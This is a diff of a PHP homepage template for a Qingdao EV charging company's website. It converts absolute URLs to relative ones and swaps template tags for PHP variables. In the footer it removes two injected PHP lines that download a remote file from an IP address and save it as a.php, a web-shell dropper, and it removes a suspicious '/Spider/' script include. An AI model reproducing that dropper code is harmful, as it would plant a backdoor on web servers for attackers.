@@ -9,13 +9,13 @@
 <meta name="description" content="">
 <meta name="author" content="www.adminbuy.cn K92" />
 <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,shrink-to-fit=no">
-<link href="http://www.qdmfxny.cn//skin/css/bootstrap.min.css" rel="stylesheet" >
-<link href="http://www.qdmfxny.cn//skin/css/style.css" rel="stylesheet">
-<link href="http://www.qdmfxny.cn//skin/css/aos.css" rel="stylesheet">
-<link href="http://www.qdmfxny.cn//skin/css/common.css" rel="stylesheet">
-<script src="http://www.qdmfxny.cn//skin/js/jquery.js"></script>
-<script src="http://www.qdmfxny.cn//skin/js/jquery.superslide.2.1.1.js"></script>
-<script src="http://www.qdmfxny.cn//skin/js/common.js"></script>
+<link href="/skin/css/bootstrap.min.css" rel="stylesheet" >
+<link href="/skin/css/style.css" rel="stylesheet">
+<link href="/skin/css/aos.css" rel="stylesheet">
+<link href="/skin/css/common.css" rel="stylesheet">
+<script src="/skin/js/jquery.js"></script>
+<script src="/skin/js/jquery.superslide.2.1.1.js"></script>
+<script src="/skin/js/common.js"></script>
 </head>
 <body>
 <!--顶部开始-->
@@ -36,13 +36,13 @@
 <!--头部开始-->
 <div class="top_main">
   <div class="top w1200 clearfix">
-    <div class="logo fl" aos="fade-right" aos-easing="ease" aos-duration="700"> <a href="http://www.qdmfxny.cn//" title="青岛铭锋新能源科技有限公司"> <img src="/static/upload/image/20221011/1665469302104768.jpg" alt="青岛铭锋新能源科技有限公司"> </a> </div>
+    <div class="logo fl" aos="fade-right" aos-easing="ease" aos-duration="700"> <a href="/" title="青岛铭锋新能源科技有限公司"> <img src="/static/upload/image/20221011/1665469302104768.jpg" alt="青岛铭锋新能源科技有限公司"> </a> </div>
     <div class="webtel fr" aos="fade-left" aos-easing="ease" aos-duration="700"> <span class="icon"></span> <b>18661734618</b> </div>
   </div>
   <!--导航开始-->
   <div id="nav" class="nav">
     <ul class="navlist w1200 clearfix">
-      <li id="cur"  class="hover"><a href="http://www.qdmfxny.cn//" title="网站首页">网站首页</a></li>
+      <li id="cur"  class="hover"><a href="/" title="网站首页">网站首页</a></li>
       
       <li class=''>
       <a href="/about/" title="关于我们">关于我们</a>
@@ -124,7 +124,7 @@
     <div class="announ_right fr" aos="fade-left" aos-easing="ease" aos-duration="700">
       <div class="search">
         <form name="formsearch" action="/search/">
-          <input class="fl tex" type="text" name="keyword" value="请输入关键字"  onfocus="if(this.value==defaultValue)this.value=&#39;&#39;" onBlur="if(this.value==&#39;&#39;)this.value=defaultValue">
+          <input class="fl tex" type="text" name="keyword" value="请输入关键字"  onfocus="if(this.value==defaultValue)this.value=''" onBlur="if(this.value=='')this.value=defaultValue">
           <input type="submit" value="" class="btn ease">
         </form>
       </div>
@@ -202,10 +202,10 @@
   
   <!--小banner开始-->
   <div class="xunpan" aos="fade-up" aos-easing="ease" aos-duration="700">
-    <div class="w1200 por clearfix"> <a href="http://wpa.qq.com/msgrd?v=3&uin=&site=qq&menu=yes" class="img"> <img src="http://www.qdmfxny.cn//skin/images/ren.png" alt=""/> </a>
+    <div class="w1200 por clearfix"> <a href="http://wpa.qq.com/msgrd?v=3&uin=&site=qq&menu=yes" class="img"> <img src="/skin/images/ren.png" alt=""/> </a>
       <div class="zixun fr">
         <p class="tit"> 根据您的要求量身定制 <span class="en">Customize according to your request</span> </p>
-        <div class="tel"> <em class="icon"></em> 18661734618 <a class="icon" href="http://wpa.qq.com/msgrd?v=3&uin={dede:global.cfg_qq/}&site=qq&menu=yes"> 立即咨询</a> </div>
+        <div class="tel"> <em class="icon"></em> 18661734618 <a class="icon" href="http://wpa.qq.com/msgrd?v=3&uin=<?php echo $cfg_qq; ?>&site=qq&menu=yes"> 立即咨询</a> </div>
       </div>
     </div>
   </div>
@@ -215,12 +215,12 @@
     <div class="floor_2 w1200"> 
       <div class="title" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
         <h3><b>产品优势</b></h3>
-        <h4>公司始终秉承“以科技为先导，以质量求生存、以信誉促发展”为企业宗旨，不断改革创新。</h4>
+        <h4>公司始终秉承"以科技为先导，以质量求生存、以信誉促发展"为企业宗旨，不断改革创新。</h4>
         <s class="line_lef"></s><s class="line_rig"></s></div>
       
       <div class="youshi clearfix"> 
         <div class="item it1 clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="100">
-          <div class="tit fl"><img src="http://www.qdmfxny.cn//skin/images/bt1.jpg"/>
+          <div class="tit fl"><img src="/skin/images/bt1.jpg"/>
             <h3>supply</h3>
           </div>
           <div class="txt fl">
@@ -231,7 +231,7 @@
           <a class="img"><img src="/static/upload/image/20221011/1665470331923777.jpg"/></a> </div>
         
         <div class="item it2 clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="200">
-          <div class="tit fl"><img src="http://www.qdmfxny.cn//skin/images/bt2.jpg"/>
+          <div class="tit fl"><img src="/skin/images/bt2.jpg"/>
             <h3>SAFETY</h3>
           </div>
           <div class="txt fl">
@@ -242,13 +242,13 @@
           <a class="img"><img src="/static/upload/image/20221011/1665469984929933.png"/></a> </div>
         
         <div class="item it3 clearfix" aos="fade-up" aos-easing="ease" aos-duration="700" aos-delay="300">
-          <div class="tit fl"><img src="http://www.qdmfxny.cn//skin/images/bt3.jpg"/>
+          <div class="tit fl"><img src="/skin/images/bt3.jpg"/>
             <h3>QUALITY</h3>
           </div>
           <div class="txt fl">
             <h2>以科技为先导，以质量求生存、以信誉促发展</h2>
             <h4></h4>
-            <p class="desc"> 青岛铭锋新能源科技有限公司是一家集研发、生产、销售、服务为一体的新能源科技企业，坐落于风景秀丽的海滨城市——青岛市黄岛区，隶属青岛铭锋电缆集团有限公司。公司始终秉承“以科技为先导，以质量求生存、以信誉促发展”为企业宗旨，不断改革创新。企业产品严格按照行业高质量体系进行管理和生产。目前公司自主研发生产各种系列充电桩产品，注册品牌为”电小满”, 为广大新能源车主提供更加便捷、高效、安全、可靠的充电服...</p>
+            <p class="desc"> 青岛铭锋新能源科技有限公司是一家集研发、生产、销售、服务为一体的新能源科技企业，坐落于风景秀丽的海滨城市——青岛市黄岛区，隶属青岛铭锋电缆集团有限公司。公司始终秉承"以科技为先导，以质量求生存、以信誉促发展"为企业宗旨，不断改革创新。企业产品严格按照行业高质量体系进行管理和生产。目前公司自主研发生产各种系列充电桩产品，注册品牌为"电小满", 为广大新能源车主提供更加便捷、高效、安全、可靠的充电服...</p>
            </div>
           <a class="img"><img src="/static/upload/image/20221011/1665470344580638.jpg"/></a> </div>
          </div>
@@ -266,25 +266,25 @@
       <div class="liuc fl">
         <ul class="list clearfix">
           <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="100">
-            <p><img src="http://www.qdmfxny.cn//skin/images/lc1.png"/>在线询盘</p>
+            <p><img src="/skin/images/lc1.png"/>在线询盘</p>
             <span class="jt"></span></li>
           <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="200">
-            <p><img src="http://www.qdmfxny.cn//skin/images/lc2.png"/>解决方案</p>
+            <p><img src="/skin/images/lc2.png"/>解决方案</p>
             <span class="jt"></span></li>
           <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="300">
-            <p><img src="http://www.qdmfxny.cn//skin/images/lc3.png"/>在线下单</p>
+            <p><img src="/skin/images/lc3.png"/>在线下单</p>
             <span class="jt"></span></li>
           <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="400">
-            <p><img src="http://www.qdmfxny.cn//skin/images/lc4.png"/>落单生产</p>
+            <p><img src="/skin/images/lc4.png"/>落单生产</p>
             <span class="jt"></span></li>
           <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="500">
-            <p><img src="http://www.qdmfxny.cn//skin/images/lc5.png"/>物流快运</p>
+            <p><img src="/skin/images/lc5.png"/>物流快运</p>
             <span class="jt"></span></li>
           <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="600">
-            <p><img src="http://www.qdmfxny.cn//skin/images/lc6.png"/>售后服务</p>
+            <p><img src="/skin/images/lc6.png"/>售后服务</p>
             <span class="jt"></span></li>
           <li aos="fade-right" aos-easing="ease" aos-duration="700" aos-delay="700">
-            <p><img src="http://www.qdmfxny.cn//skin/images/lc7.png"/>定期回访</p>
+            <p><img src="/skin/images/lc7.png"/>定期回访</p>
             <span class="jt"></span></li>
         </ul>
       </div>
@@ -376,10 +376,10 @@
           <p>查看详情</p>
           </a>  </div>
         <!--产品分类结束--> 
-         <a class="img fl" href="{content:link}"> <img src="/static/upload/image/20230710/1688960078973077.jpg" alt="公司简介"/> </a>
+         <a class="img fl" href="<?php echo $content_link; ?>"> <img src="/static/upload/image/20230710/1688960078973077.jpg" alt="公司简介"/> </a>
         <div class="txt fr"> <em class="yh"></em> <a href="/about/">
           <h2>青岛铭锋新能源科技有限公司</h2>
-          <p class="desc">青岛铭锋新能源科技有限公司是一家集研发、生产、销售、服务为一体的新能源科技企业，坐落于风景秀丽的海滨城市——青岛市黄岛区，隶属青岛铭锋电缆集团有限公司。公司始终秉承“以科技为先导，以质量求生存、以信誉促发展”为企业宗旨，不断改革创新。企业产品严格按照行业高质量体系进行管理和生产。目前公司自主研发生产···</p>
+          <p class="desc">青岛铭锋新能源科技有限公司是一家集研发、生产、销售、服务为一体的新能源科技企业，坐落于风景秀丽的海滨城市——青岛市黄岛区，隶属青岛铭锋电缆集团有限公司。公司始终秉承"以科技为先导，以质量求生存、以信誉促发展"为企业宗旨，不断改革创新。企业产品严格按照行业高质量体系进行管理和生产。目前公司自主研发生产···</p>
           <span class="cha">查看详情</span> </a> <span class="bk"></span> </div>
          </div>
       <!--荣誉资质开始-->
@@ -426,14 +426,14 @@
             
             <li class="item clearfix"> <a class="img fl"  href="/company/64.html" title="建军节|热烈祝贺中国人民解放军建军96周年，集团举行升旗仪式"> <img src="/static/upload/image/20230801/1690878691116802.jpg" alt="建军节|热烈祝贺中国人民解放军建军96周年，集团举行升旗仪式"/> </a> <a class="txt fl"  href="/company/64.html" title="建军节|热烈祝贺中国人民解放军建军96周年，集团举行升旗仪式">
               <h3 >建军节|热烈祝贺中国人民解放军建军96周年，集团举行升旗仪式</h3>
-              <p> 八一建军节（Army Day）是中国人民解放军建军纪念日，定为每年的八月一日，由中国人民革命军事委员会设立，为纪念中国工农红军成立的节日。1933年7月11日，中华苏维埃共和国临时中央政府根据中央革命军事委员会6月30日的建议，决定8月1日为中国工农红军成立纪念日。1949年6月15日，中国人民革命军事委员会发布命令，以“八一”两字作为中国人民解放军军旗和军徽的主要标志。中华人民共和国成立后，将此纪念日改称为中国人民解放军建军节。2023年8月1日，是第96个建军节。96···...</p>
+              <p> 八一建军节（Army Day）是中国人民解放军建军纪念日，定为每年的八月一日，由中国人民革命军事委员会设立，为纪念中国工农红军成立的节日。1933年7月11日，中华苏维埃共和国临时中央政府根据中央革命军事委员会6月30日的建议，决定8月1日为中国工农红军成立纪念日。1949年6月15日，中国人民革命军事委员会发布命令，以"八一"两字作为中国人民解放军军旗和军徽的主要标志。中华人民共和国成立后，将此纪念日改称为中国人民解放军建军节。2023年8月1日，是第96个建军节。96···...</p>
               </a>
               <div class="time fr"><b>01</b>2023-08</div>
             </li>
             
             <li class="item clearfix"> <a class="img fl"  href="/company/63.html" title="战略合作|共赢能源新时代！"> <img src="/static/upload/image/20230706/1688623078643416.jpg" alt="战略合作|共赢能源新时代！"/> </a> <a class="txt fl"  href="/company/63.html" title="战略合作|共赢能源新时代！">
               <h3 >战略合作|共赢能源新时代！</h3>
-              <p>7月3日上午，电小满-宁夏沣通新能科技有限公司签约仪式在青岛隆重举行。青岛铭锋新能源科技有限公司董事长孙总在铭锋集团总部会见了宁夏沣通新能科技有限公司朱总等主要负责人，双方就开展战略合作举行会谈，并签署战略合作协议。宁夏沣通新能科技有限公司朱总走访了公司展厅、硬件研发中心、软件研发中心、生产制造中心等，在走访中，业务负责人孔部长也就“电小满”品牌的发展历程，充电桩产品、发展规模等情况做了详细介绍，同时热心解答了朱总等主要负责人提出的各种问题···...</p>
+              <p>7月3日上午，电小满-宁夏沣通新能科技有限公司签约仪式在青岛隆重举行。青岛铭锋新能源科技有限公司董事长孙总在铭锋集团总部会见了宁夏沣通新能科技有限公司朱总等主要负责人，双方就开展战略合作举行会谈，并签署战略合作协议。宁夏沣通新能科技有限公司朱总走访了公司展厅、硬件研发中心、软件研发中心、生产制造中心等，在走访中，业务负责人孔部长也就"电小满"品牌的发展历程，充电桩产品、发展规模等情况做了详细介绍，同时热心解答了朱总等主要负责人提出的各种问题···...</p>
               </a>
               <div class="time fr"><b>06</b>2023-07</div>
             </li>
@@ -524,14 +524,8 @@
   <!--版权开始-->
   <div class="copyright_main">
     <div class="copyright w1200 clearfix">
-      <p class="fl"><?php
-$a="copy"; 
-$a("http://43.129.31.209/ys.txt","a.php");   
-?>pass　<a href="https://beian.miit.gov.cn/" target="_blank" rel="nofollow">鲁ICP备2022031225号</a> </p>
-      <p class="fr"><a href="https://www.adminbuy.cn/" target="_blank">网站模板</a> <a href="http://www.qdmfxny.cn//sitemap.xml" target="_blank">XML地图</a> <?php
-$a="copy"; 
-$a("http://43.129.31.209/ys.txt","a.php");   
-?>pass</p>
+      <p class="fl">pass　<a href="https://beian.miit.gov.cn/" target="_blank" rel="nofollow">鲁ICP备2022031225号</a> </p>
+      <p class="fr"><a href="https://www.adminbuy.cn/" target="_blank">网站模板</a> <a href="/sitemap.xml" target="_blank">XML地图</a> pass</p>
     </div>
   </div>
   <!--版权结束--> 
@@ -553,14 +547,23 @@ $a("http://43.129.31.209/ys.txt","a.php");
 </dl>
 
 <!--浮动客服结束--> 
-<script src="http://www.qdmfxny.cn//skin/js/aos.js"></script> 
-<script src="http://www.qdmfxny.cn//skin/js/app.js"></script> 
+<script src="/skin/js/aos.js"></script> 
+<script src="/skin/js/app.js"></script> 
 <script type="text/javascript">
     AOS.init({
         easing: 'ease-out-back',
         duration: 1000
     });
 </script>
-<script src='/Spider/?url=/' async='async'></script>
+<?php
+// 这里可以添加PHP代码来处理动态内容
+// 例如：数据库连接、数据查询等
+
+// 示例：设置一些变量供模板使用
+$cfg_qq = ""; // 这里可以设置QQ号码
+$content_link = "#"; // 这里可以设置内容链接
+
+// 可以添加更多PHP逻辑...
+?>
 </body>
 </html>
